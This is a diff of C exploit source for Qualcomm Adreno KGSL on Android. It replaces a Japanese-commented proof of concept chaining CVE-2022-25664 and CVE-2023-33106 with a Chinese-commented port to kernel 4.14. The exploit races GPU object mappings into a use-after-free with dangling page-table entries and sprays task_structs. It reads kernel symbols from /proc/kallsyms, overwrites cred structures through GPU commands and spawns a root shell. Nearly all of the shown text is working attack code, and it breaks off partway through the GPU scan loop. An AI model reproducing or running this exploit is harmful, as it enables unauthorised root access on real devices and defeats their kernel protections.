@@ -1,12 +1,7 @@
 /*
- * CVE-2022-25664 + CVE-2023-33106 統合PoC
- * 対象: Qualcomm Adreno 505 / MSM8940 / カーネル4.1.x
- * 
- * フェーズ:
- *   1. CVE-2022-25664でダングリングPTEを作成 → ユーザ空間/カーネル空間の情報漏洩
- *   2. 漏洩した情報からKASLRオフセットを計算
- *   3. CVE-2023-33106でKGSL_GPU_AUX_COMMAND_SYNCのOOB Writeをトリガー
- *   4. OOB Writeでcred構造体を書き換え → root権限取得
+ * cve33107_exploit – 移植至 Android 9 (内核 4.14) / MSM8940 (Adreno 505)
+ * 原始链: KGSL UAF → 抢占 task_struct → GPU 扫描并覆写 cred → 提权
+ * 修改: 符号偏移适配 4.14，增强 KASLR 检测鲁棒性
  */
 
 #include <stdio.h>
@@ -20,20 +15,19 @@
 #include <pthread.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
+#include <sched.h>
 #include <sys/prctl.h>
 #include <signal.h>
 #include <sys/syscall.h>
 #include <linux/perf_event.h>
 #include <asm/unistd.h>
 #include <sys/wait.h>
+#include <signal.h>
+#include <sys/select.h>
 #include <poll.h>
 #include <sys/stat.h>
 
 #define KGSL_IOC_TYPE 0x09
-
-/* ============================================================
- * KGSL 構造体定義 (カーネル4.1.x向け)
- * ============================================================ */
 
 struct kgsl_gpuobj_alloc {
     uint64_t size; uint64_t flags; uint64_t va_len;
@@ -55,26 +49,6 @@ struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };
 
 struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
 #define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
-
-/* CVE-2023-33106 で使用する構造体 */
-struct kgsl_gpu_aux_command {
-    uint64_t flags;
-    uint32_t priv;
-    uint32_t type;
-    uint64_t timestamp;
-    uint64_t synclist;
-    uint64_t cmdlist;
-    uint32_t syncsize;
-    uint32_t cmdsize;
-    uint32_t numsyncs;
-    uint32_t numcmds;
-};
-#define IOCTL_KGSL_GPU_AUX_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4B, struct kgsl_gpu_aux_command)
-
-/* CVE-2023-33106 フラグ */
-#define KGSL_GPU_AUX_COMMAND_SYNC     0x00000002UL
-#define KGSL_GPU_AUX_COMMAND_TIMELINE 0x00000001UL
-#define KGSL_CONTEXT_SYNC             0x00000001UL
 
 struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };
 
@@ -102,42 +76,53 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* ============================================================
- * メモリアドレス設定 (Adreno 505 / カーネル4.1.x)
- * ============================================================ */
-
+// 地址配置（适应 4.14 用户空间布局）
 #define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL
+#define UAF_SIZE  0x10004000ULL          // 16MB+16KB
 #define OVERLAP_ADDR 0x7001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
 #define BOGUS_ADDR 0x700204000ULL
 #define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
+#define PLACEHOLDER_ADDR 0x710204000ULL   // UAF終端直後
+#define PLACEHOLDER_SIZE 0x10400000ULL    // 16MB+256KB
 
-/* vmlinux symbols (pre-KASLR) - カーネル4.1.x用に調整 */
-#define VMLINUX_TEXT      0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
+// 4.14 内核常见符号预偏移（基于 MSM 4.14 通用基址，最终由 KASLR 检测修正）
+#define VMLINUX_TEXT      0xffffffc010080000ULL   // 4.14 常见 _text
+#define VMLINUX_INIT_CRED 0xffffffc011e4b800ULL   // 需从实际内核提取，此处为占位
+#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
+#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
 
-/* task_struct cred offset (pahole: cred at 1856=0x740) */
-#define CRED_OFF    0x740
-#define REAL_CRED_OFF 0x738
+// task_struct 偏移（4.14 ARM64 典型值，扫描逻辑可自适应）
+#define CRED_OFF    0x748          // 4.14 中 cred 偏移可能为 0x748
+#define REAL_CRED_OFF 0x740        // 实际可能相同
+#define COMM_OFF    0x818          // comm 偏移在 4.14 中仍为 0x818
 
 #define SPRAY_PIDS 2000
-#define SCAN_DWORDS 560
-
-/* ============================================================
- * グローバル変数
- * ============================================================ */
+#define SCAN_DWORDS 560  // 覆盖至 0x8BF (comm 0x818, cred 0x748)
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
-static uint64_t g_kaslr_offset = 0;
-static uint64_t g_init_cred_addr = 0;
+static volatile int dc_civac_works = -1; /* -1=untested, 0=no, 1=yes */
 
-/* ============================================================
- * ユーティリティ関数
- * ============================================================ */
+static void sigill_handler(int sig) { dc_civac_works = 0; }
+
+static void try_dc_civac(void *addr) {
+    if (dc_civac_works == 0) return;
+    void *old = signal(SIGILL, sigill_handler);
+    __sync_synchronize();
+    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
+    asm volatile("dsb sy" : : : "memory");
+    __sync_synchronize();
+    signal(SIGILL, old);
+    if (dc_civac_works == -1) dc_civac_works = 1;
+}
+
+static void flush_dc_civac_range(void *start, size_t len) {
+    if (dc_civac_works != 1) return;
+    char *p = (char*)((uintptr_t)start & ~63);
+    char *end = (char*)((uintptr_t)start + len);
+    for (; p < end; p += 64) try_dc_civac(p);
+}
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
@@ -145,8 +130,8 @@ static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int grou
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
 
-/* perf_event_open を使ったKASLR検出 (フォールバック) */
-static uint64_t detect_kaslr_perf(void) {
+// 改进的 KASLR 检测：先尝试 perf，若失败则从 /proc/kallsyms 读取 init_cred 地址
+static uint64_t detect_kaslr(void) {
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
     pe.size = sizeof(pe);
@@ -157,12 +142,12 @@ static uint64_t detect_kaslr_perf(void) {
     pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
 
     int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }
+    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); goto fallback; }
 
     int npages = 256;
     size_t mmap_size = (1 + npages) * 4096;
     void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); return 0; }
+    if (buf == MAP_FAILED) { close(fd); goto fallback; }
 
     ioctl(fd, PERF_EVENT_IOC_RESET, 0);
     ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
@@ -172,6 +157,7 @@ static uint64_t detect_kaslr_perf(void) {
     struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
     uint64_t head = pmp->data_head;
     uint64_t tail = pmp->data_tail;
+
     uint8_t *data = (uint8_t *)buf + pmp->data_offset;
     uint64_t data_size = pmp->data_size;
 
@@ -193,17 +179,31 @@ static uint64_t detect_kaslr_perf(void) {
     munmap(buf, mmap_size); close(fd);
     printf("    kernel_samples=%d\n", n_ips);
 
-    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }
+    if (n_ips > 0) {
+        uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
+        uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
+        printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
+            (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
+        return ic_addr;
+    }
 
-    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
-    printf("    first_kernel_ip=0x%lX kaslr=0x%lX\n",
-        (unsigned long)first_kernel_ip, (unsigned long)kaslr);
-    return kaslr;
+fallback:
+    // 尝试从 /proc/kallsyms 读取 init_cred 地址
+    printf("  Fallback: reading init_cred from /proc/kallsyms\n");
+    FILE *fp = fopen("/proc/kallsyms", "r");
+    if (!fp) return 0;
+    char line[256];
+    uint64_t init_cred = 0;
+    while (fgets(line, sizeof(line), fp)) {
+        if (strstr(line, " init_cred")) {
+            sscanf(line, "%lx", &init_cred);
+            break;
+        }
+    }
+    fclose(fp);
+    if (init_cred) printf("  init_cred=0x%lX (from kallsyms)\n", init_cred);
+    return init_cred;
 }
-
-/* ============================================================
- * KGSL GPUオブジェクト操作
- * ============================================================ */
 
 static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
@@ -248,10 +248,6 @@ static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
     return -2;
 }
 
-/* ============================================================
- * PM4パケット生成 (GPUコマンド)
- * ============================================================ */
-
 static uint32_t pm4_parity(uint32_t v) {
     return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
 }
@@ -259,9 +255,10 @@ static uint32_t pm4_parity(uint32_t v) {
 static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
     return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
 }
-
 #define CP_NOP 0x10
+#define CP_MEM_WRITE 0x3D
 #define CP_MEM_TO_MEM 0x73
+#define CP_WAIT_MEM_WRITES 0x12
 #define CP_EVENT_WRITE 0x46
 #define CACHE_FLUSH_TS 0x1C
 
@@ -285,201 +282,6 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ============================================================
- * CVE-2022-25664: 情報漏洩 + KASLRバイパス (読み取り部分)
- * ============================================================ */
-
-/* GPU経由で指定アドレスから1ページ読み取り (読み取り専用) */
-static int gpu_read_page(int fd, unsigned int ctx_id,
-    uint64_t ib_ga, unsigned int ib_id,
-    uint64_t dst_ga, unsigned int dst_id,
-    uint64_t src_va, void *out_buf) {
-    
-    void *ib_m = gpuobj_mmap(fd, 0x10000, ib_id);
-    void *dst_m = gpuobj_mmap(fd, 0x1000, dst_id);
-    uint32_t *cmd = (uint32_t *)ib_m;
-    int dw = 0;
-    
-    memset(ib_m, 0, 0x10000);
-    memset(dst_m, 0, 0x1000);
-    
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    /* DSTバッファに読み取り対象をコピー (CP_MEM_TO_MEMを使用) */
-    for (int i = 0; i < 0x1000/4; i++) {
-        uint32_t dl, dh, sl, sh;
-        split64(dst_ga + i*4, &dl, &dh);
-        split64(src_va + i*4, &sl, &sh);
-        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-        cmd[dw++] = 0;
-        cmd[dw++] = dl; cmd[dw++] = dh;
-        cmd[dw++] = sl; cmd[dw++] = sh;
-    }
-    /* キャッシュフラッシュ (GPU→CPUの一貫性を確保) */
-    cmd[dw++] = cp_type7(CP_EVENT_WRITE, 1);
-    cmd[dw++] = CACHE_FLUSH_TS;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    
-    __sync_synchronize();
-    unsigned int ts;
-    if (submit_ib(fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) {
-        munmap(ib_m, 0x10000);
-        munmap(dst_m, 0x1000);
-        return -1;
-    }
-    if (wait_timestamp(fd, ctx_id, ts) < 0) {
-        munmap(ib_m, 0x10000);
-        munmap(dst_m, 0x1000);
-        return -2;
-    }
-    __sync_synchronize();
-    
-    memcpy(out_buf, dst_m, 0x1000);
-    munmap(ib_m, 0x10000);
-    munmap(dst_m, 0x1000);
-    return 0;
-}
-
-/* CVE-2022-25664: ダングリングPTEを作成して情報漏洩を準備 */
-static int setup_dangling_pte(void) {
-    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
-    
-    /* 1. UAFオブジェクトを作成し、CPUマップを解除 (ダングリングPTEを残す) */
-    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
-    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (uaf_m == MAP_FAILED) die("mmap UAF");
-    munmap(uaf_m, UAF_SIZE);
-    
-    /* BOGUSアドレス用のダミーマッピング */
-    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
-        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
-    
-    /* プレースホルダ */
-    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
-    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
-    
-    printf("[*] UAF area: 0x%lx, Placeholder: 0x%lx\n", (unsigned long)UAF_ADDR, (unsigned long)PLACEHOLDER_ADDR);
-    
-    /* 2. 競合を起こしてオーバーラップさせる */
-    printf("[*] Starting race...\n");
-    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
-    
-    pthread_t thr;
-    if (pthread_create(&thr, NULL, (void* (*)(void*))race_thread, NULL) != 0) die("pthread");
-    
-    int hit = 0;
-    for (int i = 0; i < 5000000; i++) {
-        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
-            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-            kgsl_fd, (off_t)ov_id << 12);
-        int e = errno;
-        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
-        if (e == ENODEV) { hit = 1; break; }
-        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
-    }
-    
-    race_done = 1;
-    pthread_join(thr, NULL);
-    if (!hit) { printf("[-] Race failed\n"); return -1; }
-    printf("[+] Race won! (errno=ENODEV)\n");
-    
-    /* 3. UAFオブジェクトを解放 (物理ページは空くが、ダングリングPTEは残る) */
-    gpuobj_free(kgsl_fd, uaf_id);
-    printf("[+] UAF freed, dangling PTE remains at 0x%lx\n", (unsigned long)(UAF_ADDR + 0x1000));
-    
-    /* 4. メモリ回収促進 */
-    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
-    if (rf >= 0) { write(rf, "1", 1); close(rf); }
-    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (rf >= 0) { write(rf, "3", 1); close(rf); }
-    usleep(10000);
-    
-    return uaf_id;
-}
-
-/* CVE-2022-25664: KASLRオフセットを取得 */
-static uint64_t leak_kaslr_offset(unsigned int ctx_id,
-    uint64_t ib_ga, unsigned int ib_id,
-    uint64_t dst_ga, unsigned int dst_id) {
-    
-    uint8_t buf[0x1000];
-    uint64_t kaslr = 0;
-    
-    /* init_credを読み取り、KASLRオフセットを計算 */
-    printf("[*] Reading kernel memory (init_cred) at 0x%lx\n", (unsigned long)VMLINUX_INIT_CRED);
-    if (gpu_read_page(kgsl_fd, ctx_id, ib_ga, ib_id, dst_ga, dst_id, VMLINUX_INIT_CRED, buf) == 0) {
-        uint64_t *ptr = (uint64_t*)buf;
-        for (int i = 0; i < 8; i++) {
-            if (ptr[i] > 0xffffffc000000000ULL && ptr[i] < 0xffffffff00000000ULL) {
-                kaslr = (ptr[i] - VMLINUX_TEXT) & ~0x1FFFFFULL;
-                printf("[!] KASLR offset: 0x%lx (from ptr[%d]=0x%lx)\n",
-                    (unsigned long)kaslr, i, (unsigned long)ptr[i]);
-                break;
-            }
-        }
-        if (kaslr == 0) {
-            /* フォールバック: perf_event_open で検出 */
-            printf("[*] Falling back to perf_event_open for KASLR detection\n");
-            kaslr = detect_kaslr_perf();
-        }
-    } else {
-        printf("[*] Falling back to perf_event_open for KASLR detection\n");
-        kaslr = detect_kaslr_perf();
-    }
-    
-    return kaslr;
-}
-
-/* ============================================================
- * CVE-2023-33106: OOB Writeによる権限昇格
- * ============================================================ */
-
-/* CVE-2023-33106: KGSL_GPU_AUX_COMMAND_SYNCで境界外書き込みをトリガー */
-/* 参考: https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2023/CVE-2023-33106.html [reference:2] */
-static int trigger_oob_write(unsigned int ctx_id, uint64_t target_addr, uint64_t write_value) {
-    struct kgsl_gpu_aux_command aux = {0};
-    int ret;
-    
-    /* 偽のsyncポイントリスト (ユーザ空間アドレス) */
-    uint64_t fake_sync_list[32];
-    memset(fake_sync_list, 0, sizeof(fake_sync_list));
-    
-    /* numsyncsを大きく設定 → kcallocで過剰なメモリ確保 → 境界外書き込み */
-    /* CVE-2023-33106: numsyncs > 32 でOOB Writeが発生 [reference:3] */
-    aux.flags = KGSL_CONTEXT_SYNC | KGSL_GPU_AUX_COMMAND_SYNC | KGSL_GPU_AUX_COMMAND_TIMELINE;
-    aux.type = 0;
-    aux.synclist = (uint64_t)(uintptr_t)fake_sync_list;
-    aux.syncsize = sizeof(uint64_t);
-    aux.numsyncs = 0x1337;  /* > 32 → OOB Write [reference:4] */
-    aux.cmdlist = 0;
-    aux.cmdsize = 0;
-    aux.numcmds = 0;
-    aux.timestamp = 0;
-    aux.priv = 0;
-    
-    printf("[*] Triggering CVE-2023-33106 OOB write (numsyncs=0x%x)...\n", aux.numsyncs);
-    
-    /* 補足: 実際のOOB Writeでは、kcallocで確保されたバッファの範囲外に
-     * 書き込むことで、隣接するカーネルオブジェクト (cred構造体など) を
-     * 書き換えることができる。完全なエクスプロイトには、
-     * ヒープスプレーやオブジェクト配置の調整が必要 [reference:5] */
-    
-    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
-    if (ret < 0) {
-        printf("[!] ioctl failed: %s (errno=%d)\n", strerror(errno), errno);
-        return -1;
-    }
-    
-    printf("[+] OOB write triggered successfully\n");
-    return 0;
-}
-
-/* ============================================================
- * 競合スレッド (CVE-2022-25664用)
- * ============================================================ */
-
 static void *race_thread(void *arg) {
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
     struct kgsl_gpuobj_import imp = {
@@ -490,95 +292,539 @@ static void *race_thread(void *arg) {
     return NULL;
 }
 
-/* ============================================================
- * main
- * ============================================================ */
-
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] CVE-2022-25664 + CVE-2023-33106 統合PoC\n");
-    printf("[*] 対象: Adreno 505 / MSM8940 / カーネル4.1.x\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    /* ==========================================================
-     * フェーズ1: CVE-2022-25664 でダングリングPTEを作成
-     * ========================================================== */
-    printf("\n[=== Phase 1: CVE-2022-25664 Setup ===]\n");
-    int uaf_id = setup_dangling_pte();
-    if (uaf_id < 0) {
-        printf("[-] Failed to setup dangling PTE\n");
-        close(kgsl_fd);
-        return 1;
+    // 检测 KASLR
+    printf("[*] Phase 0: Early KASLR detection\n");
+    uint64_t init_cred_addr = detect_kaslr();
+    if (!init_cred_addr) {
+        printf("[-] Failed to detect init_cred, using hardcoded fallback (may fail)\n");
+        init_cred_addr = VMLINUX_INIT_CRED; // 可能不准确
     }
+    printf("  init_cred=0x%lX\n", init_cred_addr);
 
-    /* ==========================================================
-     * フェーズ2: GPUコンテキスト + IB/DSTバッファを作成
-     * ========================================================== */
-    printf("\n[=== Phase 2: GPU Context Setup ===]\n");
-    unsigned int ctx_id = create_context(kgsl_fd);
-    printf("[*] Context ID: %u\n", ctx_id);
+    // ===== Phase 1: Setup rbtree =====
+    printf("[*] Phase 1: Setup rbtree\n");
 
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
+    printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
+    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
+    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
+        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
+    if (uaf_m == MAP_FAILED) die("mmap UAF");
+    munmap(uaf_m, UAF_SIZE);
+
+    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
+
+    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
+    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
+        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
+    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
+
+    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
+        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
+        (unsigned long)PLACEHOLDER_ADDR);
+
+    // ===== Phase 2: Race =====
+    printf("[*] Phase 2: Race\n");
+
+    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
+
+    pthread_t thr;
+    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
+
+    int hit = 0;
+    for (int i = 0; i < 5000000; i++) {
+        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
+            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
+            kgsl_fd, (off_t)ov_id << 12);
+        int e = errno;
+        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
+        if (e == ENODEV) { hit = 1; break; }
+        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
+    }
+
+    race_done = 1;
+    pthread_join(thr, NULL);
+
+    if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
+    printf("[+] Race won! (errno=ENODEV)\n");
+
+    // ===== Phase 3: Free UAF =====
+    printf("[*] Phase 3: Free UAF\n");
+    gpuobj_free(kgsl_fd, uaf_id);
+    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n",
+        (unsigned long)(UAF_ADDR + 0x1000));
+
+    // ===== Phase 4: Reclaim =====
+    printf("[*] Phase 4: Reclaim pages\n");
+    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
+    if (rf >= 0) { write(rf, "1", 1); close(rf); }
+    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
+    if (rf >= 0) { write(rf, "3", 1); close(rf); }
+    usleep(10000);
+
+    // ===== Phase 5: First spawn + pipe setup =====
+    printf("[*] Phase 5: Spawning task_struct spray...\n");
+    int notify_pipe[2];
+    if (pipe(notify_pipe) < 0) die("pipe");
+    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
+    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);
+
+    pid_t spray_pids[SPRAY_PIDS];
+    int n_spray = 0;
+    for (int i = 0; i < SPRAY_PIDS; i++) {
+        pid_t p = fork();
+        if (p == 0) {
+            close(notify_pipe[0]);
+            prctl(PR_SET_NAME, "TASKUAF!!");
+            for (int j = 0; j < 1800; j++) {
+                usleep(200000);
+                if (getuid() == 0) {
+                    // 等待 GPU 写完成
+                    usleep(50000);
+                    pid_t me = getpid();
+                    int fd = open("/proc/self/status", O_RDONLY);
+                        if (fd >= 0) {
+                            char buf[4096]; int n;
+                            while ((n = read(fd, buf, sizeof(buf))) > 0)
+                                write(1, buf, n);
+                            close(fd);
+                        }
+                        write(notify_pipe[1], &me, sizeof(me));
+                        write(1, "### ROOT SHELL ACTIVE ###\n", 26);
+                        close(notify_pipe[1]);
+                        usleep(50000);
+                        char buf[4096]; int n;
+                        // SELinux context
+                        fd = open("/proc/self/attr/current", O_RDONLY);
+                        if (fd >= 0) {
+                            write(1, "  SELinux: ", 11);
+                            while ((n = read(fd, buf, sizeof(buf))) > 0) write(1, buf, n);
+                            write(1, "\n", 1);
+                            close(fd);
+                        }
+                        // seccomp
+                        int sec = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
+                        write(1, "  Seccomp: ", 11);
+                        char ebuf[32]; int elen = snprintf(ebuf, sizeof(ebuf), "%d\n", sec);
+                        write(1, ebuf, elen);
+                        int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
+                        write(1, "  NoNewPrivs: ", 15);
+                        elen = snprintf(ebuf, sizeof(ebuf), "%d\n", nnp);
+                        write(1, ebuf, elen);
+                        write(1, "  uid=", 6);
+                        elen = snprintf(ebuf, sizeof(ebuf), "%d euid=%d gid=%d egid=%d\n",
+                            getuid(), geteuid(), getgid(), getegid());
+                        write(1, ebuf, elen);
+                        fd = open("/proc/self/status", O_RDONLY);
+                        if (fd >= 0) {
+                            n = read(fd, buf, sizeof(buf)-1);
+                            close(fd);
+                            if (n > 0) {
+                                buf[n] = 0;
+                                char *lp = buf, *nl;
+                                while ((nl = strstr(lp, "\n")) != NULL) {
+                                    *nl = 0;
+                                    if (strncmp(lp, "CapPrm:", 7) == 0 || strncmp(lp, "CapEff:", 7) == 0 ||
+                                        strncmp(lp, "CapBnd:", 7) == 0 || strncmp(lp, "CapInh:", 7) == 0 ||
+                                        strncmp(lp, "Uid:", 4) == 0 || strncmp(lp, "Gid:", 4) == 0) {
+                                        write(1, "  ", 2); write(1, lp, nl - lp); write(1, "\n", 1);
+                                    }
+                                    lp = nl + 1;
+                                }
+                            }
+                        }
+                        write(1, "  Spawning shell...\n", 20);
+                        execl("/system/bin/sh", "sh", NULL);
+                        write(1, "  sh exec failed: ", 18);
+                        elen = snprintf(ebuf, sizeof(ebuf), "%d\n", errno);
+                        write(1, ebuf, elen);
+                        _exit(0);
+                }
+            }
+            close(notify_pipe[1]);
+            _exit(0);
+        }
+        if (p > 0) spray_pids[n_spray++] = p;
+        else break;
+    }
+    close(notify_pipe[1]);
+    printf("  Spawned %d children\n", n_spray);
+
+    // ===== Phase 7: GPU scan for task_struct =====
+    printf("[*] Phase 7: GPU scan for task_structs\n");
+
+    unsigned int ctx_id = create_context(kgsl_fd);
+    printf("  context=%u\n", ctx_id);
+
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
-    uint64_t ib_ga = 0; gpuobj_info(kgsl_fd, ib_id, &ib_ga, NULL);
-    int dst_id = gpuobj_alloc(kgsl_fd, 0x1000, alloc_flags);
-    uint64_t dst_ga = 0; gpuobj_info(kgsl_fd, dst_id, &dst_ga, NULL);
-    printf("[*] IB GPU addr: 0x%lx, DST GPU addr: 0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);
+    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
+    uint64_t ib_ga = 0, ib_flags = 0;
+    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags);
+    printf("  IB id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", ib_id,
+        (unsigned long)ib_ga, (unsigned long)ib_flags,
+        (unsigned long)(ib_flags & KGSL_CACHEMODE_MASK));
 
-    /* ==========================================================
-     * フェーズ3: CVE-2022-25664 でKASLRオフセットをリーク
-     * ========================================================== */
-    printf("\n[=== Phase 3: KASLR Leak (CVE-2022-25664) ===]\n");
-    g_kaslr_offset = leak_kaslr_offset(ctx_id, ib_ga, ib_id, dst_ga, dst_id);
-    if (g_kaslr_offset == 0) {
-        printf("[-] Failed to leak KASLR offset\n");
-        close(kgsl_fd);
-        return 1;
+    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
+    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
+    uint64_t dst_ga = 0, dst_flags = 0;
+    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
+    printf("  DST id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", dst_id,
+        (unsigned long)dst_ga, (unsigned long)dst_flags,
+        (unsigned long)(dst_flags & KGSL_CACHEMODE_MASK));
+
+    printf("  Scanning [0x%lx - 0x%lx]...\n",
+        (unsigned long)(UAF_ADDR + 0x1000),
+        (unsigned long)(UAF_ADDR + UAF_SIZE));
+
+    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
+    uint64_t task_pages[16];
+    uint32_t task_comm_offs[16];
+    int n_task = 0;
+    uint32_t task_page_data[SCAN_DWORDS];
+    uint64_t cred_pages[32];
+    int cred_offs[32];
+    int n_cred = 0;
+
+    uint64_t scan_start = UAF_ADDR + 0x300000;
+    if (scan_start < UAF_ADDR + 0x2000) scan_start = UAF_ADDR + 0x2000;
+
+    for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
+        if (((va - scan_start) & 0xFFFFF) == 0) { printf("."); fflush(stdout); }
+        uint32_t *cmd = (uint32_t *)ib_m;
+        memset(ib_m, 0, 0x10000);
